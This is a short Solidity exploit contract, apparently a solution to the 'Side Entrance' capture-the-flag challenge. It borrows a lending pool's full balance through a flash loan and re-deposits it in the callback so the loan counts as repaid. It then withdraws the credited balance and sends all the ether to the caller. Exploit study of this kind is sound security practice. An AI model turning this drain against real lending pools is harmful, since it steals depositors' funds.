pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Aaron is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external override payable {
        pool.deposit{value: msg.value}();
    }

    receive() payable external {}

    function pwn() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}
